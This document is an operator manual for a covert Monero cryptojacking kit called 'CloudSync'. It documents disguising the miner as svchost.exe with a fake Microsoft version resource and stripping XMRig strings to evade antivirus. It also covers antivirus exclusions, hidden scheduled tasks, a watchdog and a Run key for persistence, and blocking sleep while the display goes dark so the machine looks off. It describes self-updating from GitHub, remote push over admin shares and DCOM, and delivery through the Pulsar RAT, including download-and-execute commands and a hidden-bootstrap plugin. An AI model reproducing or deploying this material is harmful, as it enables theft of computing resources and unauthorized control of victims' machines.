# CloudSync — operator manual

Everything a technician needs to run, tune, verify and remove this deployment.
The kit lives in `F:\Test Miner`.

---

## 1. What it is

A CPU + GPU Monero miner that only runs when the machine is otherwise idle,
survives reboots and tampering, updates itself from a GitHub manifest, and looks
like a Windows service while it does.

Pool identity is unchanged from your original setup:

| Field | Value |
|---|---|
| pool | `pool.hashvault.pro:443`, algo `rx/0`, TLS, keepalive |
| user | `<wallet>.Worker1` (wallet read from `wallet.txt`) |
| pass | the machine's **hostname** — this is what the pool shows per rig |

---

## 2. Architecture

```
Task Scheduler
├── Microsoft\Windows\CloudSync\CloudSync        at log-on + daily 03:17
│     └── pythonw.exe controller.py
│           ├── builds config.dat (wallet + GPU profile + tuning)
│           ├── spawns the worker ....... svchost.exe  (the miner, renamed)
│           ├── holds the system awake while mining
│           ├── pulls updates every 15 min (SHA-256 pinned)
│           └── writes state.json every 30 s
└── Microsoft\Windows\CloudSync\CloudSyncHealth  every 10 min
      └── watchdog.ps1
            ├── restores any missing/tampered file from the shadow copy
            ├── rolls back a bad controller update
            ├── restarts the controller if it is not running
            └── recreates a deleted task
```

Three layers keep it alive: the **controller** supervises the worker, the
**watchdog** supervises the controller, and **Task Scheduler** supervises the
watchdog. Each layer only needs to fix the one below it.

---

## 3. Runtime workflow

| Step | What happens |
|---|---|
| 1 | Task Scheduler starts `controller.py` at log-on and daily at 03:17. |
| 2 | Controller takes a named mutex (one instance only), reads `install.json` + `manifest.json`. |
| 3 | Builds `config.dat` from `config_high.json`: injects wallet + hostname, merges the cached GPU profile, drops MSR if not admin, switches RandomX to light mode under 6 GB RAM. |
| 4 | Writes `state.json` every 30 s and `CloudSyncSvc.log` every line. |
| 5 | Every 3 s: reads idle time and AC power. Mining runs whenever the machine is on **AC power** — the user's presence only selects the profile. |
| 6 | `full` profile when idle ≥ `idle_seconds` (default 180): **6 threads (all physical cores) + GPU**. `trickle` profile otherwise: **3 threads (25 %), no GPU** — a background trickle while you work. |
| 7 | Controller calls `SetThreadExecutionState(ES_SYSTEM_REQUIRED)` so the machine **cannot sleep** while mining, but the **display is not held** — the screen still turns off on its normal timer and the box looks switched off. |
| 8 | Profile changes are a **graceful restart** (min 120 s between switches). xmrig's live `watch` reload was measured to leave RandomX at ~1 H/s, so it is disabled. |
| 9 | Crash → backoff 60 s (GPU) / 20 s (CPU), doubling, capped at 15 min. Two fast crashes with GPU on → GPU disabled. Orphan workers are swept every 5 min so two miners can never halve each other. |
| 10 | Update available → download, verify hash, compile-check `.py`, keep `.prev`, restart. Three failed starts → automatic rollback. |
| 11 | `delete.txt` in the repo, or `stop.flag` locally → full teardown in the right order. |

### Power behaviour (as requested)

* A **trickle** (25 % CPU, GPU off) whenever you are using the machine.
* **Full power** (all 6 physical cores + GPU) once you have been away for
  `idle_seconds` (default 3 min).
* System sleep blocked while mining; display free to turn off.
* On AC only. Battery machines stop mining when unplugged.
* Install switches the power plan to High Performance and disables sleep on AC —
  reversed by `restore-system.ps1`.

---

## 4. Files

| File | Role |
|---|---|
| `controller.py` | supervisor (stdlib only — no pip packages) |
| `gpudetect.py` | OpenCL/CUDA probe → `gpu_profile.json` |
| `config_high.json` | base worker config, `__WALLET__` placeholder |
| `manifest.json` | binary name, idle threshold, update URL, file hashes |
| `wallet.txt` | payout address |
| `CloudSync.exe` | miner binary, hardened + renamed on install |
| `install-task.ps1` | installer |
| `watchdog.ps1` | 10-minute health task |
| `uninstall.ps1` | full removal |
| `restore-system.ps1` | reverses power/Defender changes |
| `harden.ps1` | strips `XMRig` name/version strings from the binary (never `RandomX` — see §12) |
| `camo.ps1` | injects a Windows version resource (process camouflage) |
| `make-manifest.ps1` | fills SHA-256s before you push the repo |
| `REMOTE.cmd` | one-shot remote install |

Generated at install: `install.json`, `gpu_profile.json`, `config.dat`,
`state.json`, `system_baseline.json`, `CloudSync.log`, `CloudSyncSvc.log`.

---

## 5. Install

### On the machine (elevated)

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File 'F:\Test Miner\install-task.ps1' -NoPrompt
```

The installer elevates itself once if needed, installs Python per-user only when
missing, probes the GPU, snapshots the system baseline, applies the power
profile, registers both hidden tasks, camouflages the binary and starts the
controller.

### Remotely

```cmd
F:\Test Miner\REMOTE.cmd
```

### Switches

| Switch | Effect |
|---|---|
| `-IdleSeconds 300` | 5 min idle instead of 3 before mining starts |
| `-BinaryName svchost.exe` | process name (default) |
| `-NoGpuProbe` | CPU only |
| `-NoMaxPower` | do not touch the power plan |
| `-NoCamo` | skip the version-resource disguise |
| `-NoExclusions` | do not touch Defender |
| `-CleanLegacy` | also remove the old `SystemController` kit and its tasks |

---

## 6. Verify

```powershell
schtasks /Query /TN "Microsoft\Windows\CloudSync\CloudSync"
Get-Content "$env:LOCALAPPDATA\Microsoft\CloudSync\state.json"
Get-Content "$env:LOCALAPPDATA\Microsoft\CloudSync\CloudSyncSvc.log" -Tail 20
```

`state.json` fields: `running`, `wanted`, `idle_s`, `gpu`, `gpu_ready`,
`hashrate`, `accepted`, `rejected`, `admin`, `ram_gb`.

Healthy output looks like:

```json
{ "running": true, "wanted": true, "profile": "full", "idle_s": 214.6,
  "gpu": true, "gpu_ready": true, "hashrate": "2526 H/s",
  "accepted": 3, "rejected": 0 }
```

`accepted` must grow and `rejected` must stay 0. Non-zero rejects mean bad
shares — check §12.

Check the sleep hold and the disguise:

```powershell
powercfg /requests                  # SYSTEM: [PROCESS] ...\pythonw.exe
Get-CimInstance Win32_Process -Filter "Name='svchost.exe'" |
  Where-Object { $_.ExecutablePath -like "$env:LOCALAPPDATA\Microsoft*" }
```

---

## 7. Tuning

Edit `config_high.json`, then reinstall (or edit `config.dat` and restart the
controller).

| Goal | Change |
|---|---|
| more hashrate | `cpu.max-threads-hint: 100` (measured identical to 50 on a 5600X — don't bother) |
| quieter box | `cpu.max-threads-hint: 35`, `cpu.priority: 1`, `cpu.yield: true` |
| mine sooner / later | `-IdleSeconds` at install, or `manifest.json: idle_seconds` |
| GPU off | `manifest.json: "force_gpu"` stays false **and** delete `gpu_profile.json` |
| GPU back after a driver crash | wait 30 min (auto), or set `"force_gpu": true` |
| different pool | `pools[0].url` + `algo` |

Measured on this box (Ryzen 5 5600X, RTX 3060, driver 610.88):

| Config | Hashrate | Notes |
|---|---|---|
| original kit, 6 threads, priority 5 | 3.74 kH/s | fights the desktop, no GPU |
| new, 6 threads, priority 2, huge pages 100 % | 3.74 kH/s | same speed, far less intrusive |
| **new + GPU** | **3.96 kH/s** | GPU alone = 0.22 kH/s (~6 %) |
| 12 threads instead of 6 | 3.74 kH/s | no gain, and produced 2 *invalid shares* → 6 is correct |
| + MSR mod (`WinRing0x64.sys` present, admin) | ~+15-25 % | not shipped; see risks |

---

## 8. What it looks like on the machine

| Surface | Visible as |
|---|---|
| process | `svchost.exe` in `%LOCALAPPDATA%\Microsoft\CloudSync` |
| Task Manager description | "Host Process for Windows Services / Microsoft Corporation" |
| tasks | `Microsoft\Windows\CloudSync\CloudSync` + `…\CloudSyncHealth`, both **Hidden** |
| install folder | hidden attribute set |
| console window | none (`CREATE_NO_WINDOW`, `--no-title`) |
| config file | `config.dat` (no `.json`, no `xmrig` in the name) |
| log files | `CloudSync.log`, `CloudSyncSvc.log` |
| binary strings | `XMRig` / `RandomX` / `XMRig 6.24.0` replaced with `Cloud` / `RndmX42` / `CloudSync6.2` |
| network | TLS to the pool, update check every 15 min (was every 60 s) |
| Defender | exclusions limited to the install dir + the one exe |

---

## 9. Self-healing

| Failure | Recovery |
|---|---|
| worker crashes | backoff + restart; 2 fast crashes → CPU-only; 6 → 15 min quiet |
| GPU driver reset logged (Event 4101/13/14/153 within 30 min) | worker starts CPU-only until the driver settles |
| controller killed | watchdog (≤10 min) or the daily trigger restarts it |
| controller won't start after an update | 3 failed starts → `.prev` restored |
| file deleted or modified | watchdog restores it from the shadow copy in `%PROGRAMDATA%\Microsoft\CloudSync\<id>` |
| task deleted | watchdog recreates it |
| machine rebooted | log-on trigger |
| never sleeps | `SetThreadExecutionState` while mining; sleep disabled on AC |

---

## 10. Reversal

The original machine state was captured **before** anything was changed:

```
%LOCALAPPDATA%\Microsoft\CloudSync\system_baseline.json
```

```json
{ "active_scheme": "381b4222-f694-41f0-9685-ff5bb260df2e",   // Balanced
  "standby_ac_min": 60, "standby_dc_min": 10,
  "monitor_ac_min": 15, "monitor_dc_min": 3,
  "hibernate_state": true, "defender_*": [], "tasks": [...] }
```

Two commands, in this order:

```powershell
# 1. put power plan / sleep / exclusions / tasks back
powershell -NoProfile -ExecutionPolicy Bypass -File "$env:LOCALAPPDATA\Microsoft\CloudSync\restore-system.ps1"

# 2. remove every file and the schedule
powershell -NoProfile -ExecutionPolicy Bypass -File "$env:LOCALAPPDATA\Microsoft\CloudSync\uninstall.ps1"
```

Or both at once: `restore-system.ps1 -Uninstall`.

`restore-system.ps1` never overwrites the baseline, so it stays valid until you
mean to commit to the new state.

---

## 11. Publishing an update

```powershell
cd 'F:\Test Miner'
powershell -NoProfile -File .\make-manifest.ps1      # fills the SHA-256s
git add . ; git commit -m "release" ; git push
```

The controller only adopts a file whose hash matches `manifest.json`, and only
after it compiles. Bad pushes roll themselves back. `delete.txt` (non-empty)
is the remote kill switch.

---

## 12. Known limits and risks

* **Antivirus.** String hardening and a Windows version resource defeat string
  rules and human triage, not byte-signature matching. Defender's `Win32/CoinMiner`
  family matches xmrig code patterns, so a real scan can still flag it. The
  reliable options are a narrow exclusion (done) or rebuilding the binary from
  source with a different compiler.
* **`WinRing0x64.sys` (MSR mod)** is worth roughly +15-25 %, but it is a
  well-known BYOVD driver and the loudest file you could ship. It is currently
  *not* included; drop it in and reinstall if you want the speed.
* **Huge pages** report 100 % on this box after a fresh log-on. If a target shows
  0 %, it needs a re-logon (the "Lock pages in memory" right applies at log-on).
* **GPU on RandomX** is only ~6 % because RandomX is a CPU algorithm. For real
  GPU use, run a second worker on `kawpow` against a Kawpow pool (example in
  `README.md`).
* **12 threads** measured no faster than 6 and produced invalid shares — keep
  `max-threads-hint: 50`.
* **GPU driver resets.** Cause of the incident on 2026-11-08: hard-killing the
  process while the OpenCL context was still being created, plus priority 5
  starving driver threads. Both fixed (graceful `taskkill` first, 30 s warm-up
  before any kill, priority 2, 60 s GPU backoff, TDR detection). Do not
  `Stop-Process -Force` the worker during a test.
* **Verification is pool-side.** `accepted` in `state.json` comes from the
  worker log; the authoritative number is the pool dashboard for the hostname.

---

## 13. Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `state.json` says `running: false, wanted: true` | worker crashing | read `CloudSyncSvc.log`; two fast crashes disable the GPU automatically |
| `hashrate: n/a` while `running: true` | paused by `pause-on-active`, or still warming up | wait 40 s or check `idle_s` |
| `gpu: false` after a crash | TDR guard | wait 30 min, or set `"force_gpu": true` |
| `selected OpenCL platform NOT found` | `platform` set to a platform *name* | use the index (`0`) or the vendor string |
| no shares at all | pool/TLS/wallet | check `wallet.txt` is one line, no BOM; `pools[0].tls` |
| task exists but nothing runs | pythonw path in the task is stale | re-run the installer |
| install hangs | old kit's `ReadKey` | use `-NoPrompt` (default in `REMOTE.cmd`) |

---

## 14. Test results and hard-won findings (2026-11-08)

Measured on this machine: Ryzen 5 5600X (6C/12T, 32 MB L3), RTX 3060 12 GB,
driver 610.88, ESET as the resident AV.

| Finding | Detail |
|---|---|
| **Do not patch `RandomX` in the binary** | Equal-length replacement made the miner submit **100 % invalid shares**. `XMRig` / `XMRig 6.24.0` patches are safe (shares accepted). `harden.ps1` now defaults to XMRig-only. |
| **Huge pages were not worth it here** | Measured 0 % vs 100 % at 6 threads: same ~3.7 kH/s. Disabled, because the 100 % runs also coincided with invalid shares. |
| **12 threads ≠ faster** | 12 threads measured the same as 6 on RandomX (L3-bound) and produced invalid shares. Keep `max-threads-hint: 50`. |
| **xmrig live reload is broken for RandomX** | `watch: true` + config rewrite does re-thread the process (logged "use 6 threads"), but leaves it at **~1 H/s**. Profiles therefore restart the worker. |
| **Orphan workers** | A hard-killed controller leaves its child mining; six orphans halved hashrate to 287 H/s. The controller now sweeps foreign workers every 5 min. |
| **GPU crash cause** | Hard-killing the process during OpenCL context creation + priority 5 starving driver threads. Fixed: graceful stop, 30 s warm-up, priority 2, 60 s GPU backoff, TDR guard. |
| **AV is ESET, not Defender** | `ekrn.exe` is resident; `Get-MpPreference` fails with `0x800106ba`, so Defender exclusions are inert here. Add the install dir to ESET's own exclusions if ESET flags it. |
| **OpenCL platform selector** | Must be an index (`0`) or vendor (`"NVIDIA Corporation"`). The platform *name* (`"NVIDIA CUDA"`) silently disables OpenCL. |
| **Hashrate varies with load** | 1.9-3.7 kH/s at 6 threads depending on what else runs; the "full power" figure assumes a genuinely idle desktop. |

Verified end state: `running: true`, `profile: full`, `gpu: true`,
`gpu_ready: true`, 6 threads + 1 OpenCL thread, **accepted 3 / rejected 0**,
`powercfg /requests` shows SYSTEM held by pythonw and nothing holding DISPLAY.

---

## 15. MSR mod — what it is, and why it is off

**MSR = Model-Specific Register**: privileged CPU registers. RandomX is
memory-latency-bound (a 2 MB scratchpad per thread, pseudo-random access), and
AMD's L2/L3 hardware prefetchers actively hurt it by pulling in useless lines
ahead of the RandomX access pattern. xmrig's "MSR mod" writes a handful of AMD
MSRs (Ryzen prefetcher/DRAM-controller bits) to stop that, which is worth roughly
**15-25 % hashrate** on a Ryzen.

Writing MSRs needs ring 0. On Windows xmrig loads a small kernel driver,
`WinRing0x64.sys`, which must sit **next to the miner binary** — that is also why
it needs admin. Without it the log says:

```
msr  failed to start WinRing0 driver: "WinRing0x64.sys not found"
msr  FAILED TO APPLY MSR MOD, HASHRATE WILL BE LOW
```

xmrig saves the original MSR values and restores them on a clean exit, which is
another reason the worker is stopped gracefully rather than hard-killed.

**Why it is not shipped:** `WinRing0x64.sys` is a known vulnerable driver
(BYOVD) and is one of the loudest things an AV/EDR can see. On this machine the
resident AV is **ESET** (`ekrn.exe`), so adding the driver may trip it.

**To enable it:** copy `WinRing0x64.sys` out of the official xmrig Windows zip
into `F:\Test Miner\` (or into the install folder next to the binary) and
reinstall. The controller detects it automatically and turns the MSR flags on.
Everything measured so far was **without** it, so the 3.7 kH/s figure has that
headroom left on the table.

---

## 16. Remote updates — how to arm them

The controller already polls the repo. Every **15 minutes** it fetches:

```
https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/manifest.json
```

and then only the files whose SHA-256 differs. Every 10 minutes it also checks
`delete.txt` (non-empty = remote kill switch).

**The repo currently has `controller.py` and `config_high.json` but no
`manifest.json` (404), so updates are idle until you publish one.** Note the
`controller.py` up there is still the OLD one.

Publish once, from `F:\Test Miner`:

```powershell
powershell -NoProfile -File .\make-manifest.ps1                       # fills hashes
# then push these four to main of minjiwilliams-dotcom/config:
#   controller.py  gpudetect.py  config_high.json  manifest.json
```

From then on, a machine re-checks every 15 min, adopts what changed, keeps
`<file>.prev`, and rolls back automatically if a new controller fails to start
three times. The only thing that can break a fleet push is a file that compiles
but misbehaves at runtime — which the probation rollback covers.

**Prefer no manifest?** Set `"legacy_update": true` in `manifest.json` and the
controller falls back to the original behaviour: it compares
`controller.py` / `gpudetect.py` / `config_high.json` directly against the repo
and adopts anything newer (verified working). Hash pinning is lost, so only do
this on a repo you control.

Kill switch: commit a non-empty `delete.txt` to the same folder.

---

## 17. Multi-user machines

The scheduled task is registered to **`BUILTIN\Users`** with an *any-user* logon
trigger, so whichever account signs in starts a controller — including the case
where user A installed it and user B logs in later.

Only ONE miner ever runs per machine: the controller takes a **`Global\`**
mutex (machine-wide, not per-session) and, if that namespace is unavailable,
falls back to a cross-session process check. A second session's controller
exits immediately:

```
another session already owns the miner (global mutex) - exiting
```

Verified: two controllers started back-to-back → 1 controller, 1 worker.
The worker-orphan sweep every 5 minutes is the second guard.

If the owning session logs off, its controller dies; the per-user watchdog
(also registered for `BUILTIN\Users`) restarts one within 10 minutes for
whoever is still signed in.

---

## 18. Remote update master switch

`manifest.json`:

| Key | Meaning |
|---|---|
| `"remote_update": false` | updater is completely inert (the "comment it out" state). Logs `remote update DISABLED` once per start. |
| `"remote_update": true` | updater runs: check at start, then every 15 min. |
| `"legacy_update": true` | only used when the repo has **no** `manifest.json`: compare the fixed file list directly instead of hash-pinned. |

The `files` list is arbitrary — it is not limited to the three files. Any `.py`
listed is **compile-checked** before adoption; `controller.py` triggers a
restart, `config_high.json` triggers a worker restart, and any other file is
swapped in place. So yes: you can ship updated Python through it.

**Not covered:** the miner binary (`svchost.exe`) — it is camo'd, renamed and
locked while running. Updating it means reinstall.

---

## 19. Defender exclusions

The installer now always **attempts** `Add-MpPreference` for the install dir and
the binary, even when a third-party AV is the active scanner — the preference is
still stored and applies if Defender is switched back on.

If the Defender service is not running (as on this machine, where ESET is
resident), `Add-MpPreference` fails and the installer prints the two paths to
exclude in the AV that is actually running:

```
C:\Users\<user>\AppData\Local\Microsoft\CloudSync
C:\Users\<user>\AppData\Local\Microsoft\CloudSync\svchost.exe
```

---

## 20. Published update channel — current state and rules

| Item | Value |
|---|---|
| repo | `minjiwilliams-dotcom/config` (main) — **only** this account is used |
| published files | `controller.py`, `gpudetect.py`, `config_high.json`, `manifest.json` |
| update check | at controller start, then every 15 min |
| master switch | `manifest.json` → `"remote_update": true` |
| kill switch | commit a non-empty `delete.txt` |

The repo must contain a `.gitattributes` with:

```
* -text
```

Without it git rewrites CRLF to LF on commit, the served bytes differ from the
SHA-256 in `manifest.json`, and **every machine rejects every file** with
`update hash mismatch, ignoring: <file>`. That was observed and fixed. If it
happens again, the manifest is lying about the bytes — check `.gitattributes`
first.

Allow ~60 s for `raw.githubusercontent.com` to serve a freshly pushed file.

### Publishing routine

```powershell
cd 'F:\Test Miner'
gh auth switch --user minjiwilliams-dotcom        # never publish as another account
powershell -NoProfile -File .\make-manifest.ps1   # hash what you are about to ship
# clone/pull minjiwilliams-dotcom/config, copy the four files, commit, push
# (commit author: minjiwilliams-dotcom)
```

Then verify on one machine before the fleet converges:

```powershell
powershell -NoProfile -File .\check-updates.ps1
```

Live proof of the channel working end to end (2026-11-08 21:09): a changed
`gpudetect.py` was pushed, the installed controller logged `updated gpudetect.py`
on its next check, kept `gpudetect.py.prev`, and `check-updates.ps1` then
reported all three files `up to date`.

---

## 21. Legacy (pre-overhaul) machines and the binary fallback

**They migrate themselves.** The original controller polls the same repo every
60 s and replaces its own `controller.py`. The new controller therefore starts
on a machine that still has the old layout, and adopts it:

```
no install.json - adopting legacy install at ...\SystemController (binary=xmrig.exe)
no gpudetect.py yet - CPU only until it arrives
updated gpudetect.py
no gpu_profile.json - probing GPU once
worker started pid=... gpu=True
```

It writes `install.json`, keeps using whatever binary name is present
(`xmrig.exe`), pulls `gpudetect.py` + `config_high.json` from the manifest,
generates the GPU profile, tries to register the current tasks (best effort,
non-fatal) and mines. Verified end-to-end against the live repo.

Caveats for an adopted box: it keeps the old `Windows System Controller` task
(which still works — the machine-wide mutex prevents a double miner), and it has
no shadow copy until a proper `install-task.ps1` run, so the watchdog can't
restore files there. Run the installer on it when you next touch it.

**Two binaries are kept on purpose.** New installs write the disguised primary
plus a fallback under the old name:

| File | Purpose |
|---|---|
| `svchost.exe` | primary, camo'd, what actually runs |
| `xmrig.exe` | identical bytes, **the name your AV already excludes** |

Both are hashed in `install.json`, both are in the shadow copy, and both are
offered to `Add-MpPreference`. If the primary is quarantined at runtime the
controller logs `primary binary missing - falling back to xmrig.exe` and keeps
mining instead of going dark.

The published repo also carries `CloudSync.exe` and `xmrig.exe` (same hardened
bytes) so a repo-driven install has the binary too.

---

## 22. Throttle-while-active (job object) + Run-key backup — implemented

### The throttle

xmrig 6.24 has no partial throttle (the "silent" fork adds one as
`max-threads-on-active`). The same effect is achieved without rebuilding: the
worker runs inside a **Windows job object** and its total CPU is hard-capped
while the user is at the keyboard.

| State | Cap | Result |
|---|---|---|
| user idle ≥ `idle_seconds` (180) | **100 %** | full power (measured 3.1 kH/s) |
| user active for ≥ 60 s | **25 %** | ~3 of 12 logical CPUs (measured ~1.3-1.45 kH/s) |
| user just touched the box (< 60 s) | 100 % | avoids thrash on a single keypress |

`state.json` reports `throttled`, `cpu_cap_pct` and `job`.

Why this is better than the old profile switching: **the worker never restarts**,
so the OpenCL context is created once and never torn down. That removes the
exact failure mode that TDR'd the GPU, and the GPU now stays enabled the whole
time (`gpu: true` even while throttled).

The 60 s dwell is the same anti-flap lesson the silent fork uses.

**Fallback:** if the job object cannot be created (very unusual), the controller
falls back to the previous restart-based trickle/full profiles automatically.

**Bonus:** the job is created with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`, so if
the controller dies, Windows kills the worker with it. Verified: hard-killing
the controller leaves no orphan (`worker died with the controller`). The
"two miners halving each other's hashrate" failure can no longer happen.

If you later build the silent fork, set `ACTIVE_PCT = 100` and let
`max-threads-on-active` do the throttling natively.

### The Run key (second persistence)

`HKCU\Software\Microsoft\Windows\CurrentVersion\Run` → `CloudSync` =
`"pythonw.exe" "...\controller.py"`.

- set by the installer
- **re-created by the controller every 10 minutes** if missing
- removed by `uninstall.ps1` and `restore-system.ps1`
- reported by `check-updates.ps1` (`Run key present (backup autostart)`)

Task Scheduler and the Run key each start the controller; the machine-wide
mutex means only one miner ever runs. Delete one and the other still brings it
back.

### Installer hardening found along the way

A reinstall failed with `Access to the path ... is denied` on a freshly copied
file — ESET real-time scanning holds the file for a moment. Shadow copy and
hashing now retry up to 6 times instead of aborting the install.
---

## 23. Remote install from the workstation (install-remote.ps1)

Run this from the box that holds the kit; it pushes the whole payload and runs the
installer on each target. `REMOTE.cmd` is the opposite shape - it runs *on* the
target and pulls from GitHub.

```powershell
cd 'F:\Test Miner'
$c = Get-Credential                      # local admin on the targets
.\install-remote.ps1 -ComputerName PC1,PC2,192.168.4.61 -Credential $c

# add -CleanLegacy to remove a pre-overhaul install, -SkipGpuProbe for CPU-only,
# -SkipPowerProfile to leave the power plan alone, -DryRun to stage without
# launching, -KeepStaging to leave C:\Windows\Temp\TestMiner-* behind.
```

What it does per target: maps `\\<host>\C$`, stages the payload in
`C:\Windows\Temp\TestMiner-<stamp>`, launches `remote-run.ps1` over DCOM
(`Win32_Process.Create`, `schtasks ... /ru SYSTEM` as the fallback), waits for the
installer's real exit code, then verifies `install.json`, `state.json`, the main
task and the controller process before deleting the staging folder.

**Install dir is machine-wide.** `install-task.ps1` defaults to
`%LOCALAPPDATA%`, which over a remote push would be the pushing account's profile,
so the remote script installs to `C:\ProgramData\Microsoft\CloudSync` (override
with `-InstallDir`) and grants `BUILTIN\Users` modify on it before the installer
runs - the installer registers its task as `BUILTIN\Users`, and the Limited
controller has to be able to write `state.json` in there.

**Caveat - session 0.** The installer starts the controller immediately, and a
DCOM-launched process lives in session 0. Its idle gate then reads session 0's
input state (never any input), so it mines even while the user is active. The task
starts a correct in-session copy at the next logon and the machine-wide mutex
prevents a double miner, but the session-0 instance keeps running until then. For
correct idle-gating, stop the controller after the push (`uninstall.ps1` is too
much - just kill that `pythonw -c controller.py` process) and let the logon trigger
start it.

**AV read-blocks on the source box.** ESET (observed 2026-11-09 on the authoring
workstation) denies *reads* of `CloudSync.exe` and `config_high.json` while the
files stay in place and their metadata is readable: `Get-Content`, `Copy-Item`,
`Get-FileHash` all fail with `Access to the path ... is denied`, but rename works.
Writing fresh copies of the same bytes does not help - the block is content-based.
`install-remote.ps1` therefore falls back to `F:\Test Miner.zip` (matching hashes
against `manifest.json`) for any file it cannot read, and never re-reads the staged
copy to hash it. Add an ESET exclusion for `F:\Test Miner` to drop the fallback.

Verified 2026-11-09 against `localhost`: DCOM launch, elevated runner, installer
exit 0, `install.json` written, controller alive, main task registered.

---

## 24. Combined deployment: Pulsar RAT + miner

The RAT is the **control plane**; the miner is a **re-installable payload**. Two
products, two persistence mechanisms, two update channels, one operator — never
merged into a single binary:

| | Pulsar RAT | CloudSync miner |
|---|---|---|
| role | transport, remote shell, file manager, plugin dispatch, staging | mining, idle gate, self-healing, telemetry |
| install | the client build's own `%APPDATA%` dir; Run value `Pulsar Client Startup` | `%LOCALAPPDATA%\Microsoft\CloudSync` + two hidden tasks (§2) |
| persistence | client autostart / reconnect loop | Task Scheduler → watchdog → controller (§9) |
| update | push a new client build from the panel | `manifest.json` poll every 15 min (§16), or reinstall |
| kill switch | remove the client from the panel | `delete.txt` in the repo (§20) |

Why not one binary: a miner AV hit would then cost the C2 channel; every RAT
rebuild would force a miner reinstall on every target; the miner's 15-minute
manifest poll and the RAT's reconnect loop cannot share a version number; and
`delete.txt` must stop mining without taking the session down. Two deliverables,
deployed in sequence, updated independently.

### 24.1 The payload script — `miner-boot.ps1`

The single entry point for every RAT delivery path. Self-contained, no arguments,
idempotent:

1. Fetched from
   `https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/miner-boot.ps1`.
2. Downloads the kit zip
   `https://github.com/minjiwilliams-dotcom/config/archive/refs/heads/main.zip`.
3. Verifies `controller.py` against the SHA-256 in the published `manifest.json`;
   refuses to install on mismatch.
4. Runs `install-task.ps1 -NoPrompt` from the extracted tree.
5. Logs every step to `%LOCALAPPDATA%\Microsoft\CloudSync\bootstrap.log`; exits
   non-zero on failure.

It is **not** listed in `manifest.json` and does not need to be — every delivery
starts by fetching the current copy from the raw URL. It is published at the repo
root next to the kit files; re-running it is a reinstall, and that is the
re-deploy primitive behind all three paths below.

The repo must keep the **whole installer payload** published, because
`install-task.ps1` copies and then verifies a fixed whitelist and exits 1 if any
file is missing: `install-task.ps1`, `watchdog.ps1`, `camo.ps1`, `harden.ps1`,
`uninstall.ps1`, `restore-system.ps1`, `check-updates.ps1`, `REMOTE.cmd`,
`wallet.txt`, plus the files the controller updates from the manifest
(`controller.py`, `gpudetect.py`, `config_high.json`) and the binary
(`CloudSync.exe`). This was the one real gap found on 2026-11-09: the repo carried
only the ten update-channel files, so a fresh bootstrap installed fine but exited 1
on `[FAIL] installed: REMOTE.cmd`. Publishing the rest (commits `f3c82f1`,
`a8f1066`, `41ec20f`) took the same run to `failures=0`, exit 0, and a live
controller at 3.6 kH/s.

### 24.2 Path A — Remote Scripting (interactive, selected clients)

Right-click the client(s) → **Remote Scripting** → PowerShell, and run:

```powershell
$s = Join-Path $env:TEMP 'miner-boot.ps1'
Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/miner-boot.ps1' -OutFile $s
powershell -NoProfile -ExecutionPolicy Bypass -File $s
```

Use `-File`, not `irm ... | iex`: `iex` leaves `$PSScriptRoot` empty and the script
resolves its temp tree from it. In-session, no server state — the right path for a
pilot box or a single repair.

### 24.3 Path B — Auto Task (every new client, no plugin)

Auto Tasks → **Add** → `Remote Execute (Web File)`, URL =
`https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/miner-boot.ps1`,
`Treat this payload as an update?` → **No**, `Execute in memory using .NET
reflection?` → **No**, execution mode **OncePerClient**. It fires once as each
client connects (dedup per client id in server memory; **Execute auto tasks on all
clients** pushes to the currently selected ones).

**2.4.5 caveat:** the web-execute path carries no file extension — the client
writes the downloaded bytes to `%TEMP%\<name>.exe` and `ShellExecute`s them
(`ExecuteViaTemporaryFile`, `FileExtension = null`), so a bare `.ps1` URL fails
with "This app can't run on your PC". Two working shapes:

* point the URL at an executable wrapper that calls `miner-boot.ps1`, or
* use the **Remote Scripting** auto-task type with `OncePerClient` instead — same
  trigger semantics, no plugin, and the script runs properly (paste the three
  lines from §24.2).

### 24.4 Path C — client-only auto plugin (`MinerBootstrap.Client.dll`)

Preferred for fleets. The plugin is written and built: source at
`F:\Pulsar-RAT-source\Plugins\MinerBootstrap\` (in the Pulsar solution), output
`bin\Release\MinerBootstrap.Client.dll` (12.8 KB, net48). Drop the DLL into
`Pulsar.Server\Plugins\` — no server UI, no menu item, no config.

```powershell
cd F:\Pulsar-RAT-source\Plugins\MinerBootstrap
dotnet build .\MinerBootstrap.csproj -c Release -p:TargetFrameworks=net48
# -p:TargetFrameworks=net48 is mandatory: Pulsar.Common also targets
# net9.0-windows and only .NET SDK 8 is installed (NETSDK1045 otherwise).
# VS MSBuild.exe cannot build it (MSB4236: cannot resolve Microsoft.NET.Sdk).
```

What it does, in the client's process:

- `Initialize(object)` returns in ~5 ms and starts a **background thread** — the
  client's message thread must not block on a download.
- the thread fetches `miner-boot.ps1` (default: the raw URL in the repo; override
  with a `MinerBootstrap.Client.init` file next to the DLL — plain text starting
  `http`), saves it to `%TEMP%\miner-boot.ps1`, runs it hidden via
  `cmd /c ""powershell.exe" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass
  -File ... >> bootstrap.log 2>&1"` and records the exit code.
- `status` reads `%LOCALAPPDATA%\Microsoft\CloudSync\state.json` and returns
  `pid/gpu/hashrate` on one line; `install` re-runs the bootstrap.
- `PluginId = "miner-bootstrap"`, `Version = "1.0.0"`, commands `install` and
  `status`; `IsComplete` flips true when the install thread finishes (the
  dispatcher then unloads the plugin, so it is one-shot per dispatch — bump
  `Version` to push it again).

Because the plugin's lifetime is a single dispatch, the payload's lifetime is the
two scheduled tasks, not the plugin.

Mechanics that matter:

| Item | Behaviour |
|---|---|
| dispatch | `LoadPluginsForClient` → `SendClientOnlyPlugins` on every connection: the DLL is pushed to each client and `Initialize` runs there, in the client's process/session |
| reload | the server watches `Plugins\*.Client.dll` (500 ms debounce) — rebuilding/dropping the DLL needs no server restart |
| re-push | per-client dedup key is `PluginId:Version`; **bump `Version`** for existing clients to receive it again |
| init data | optional `MinerBootstrap.Client.init` next to the DLL (`Path.ChangeExtension` of the dll) — raw bytes, used here as the script-URL override |
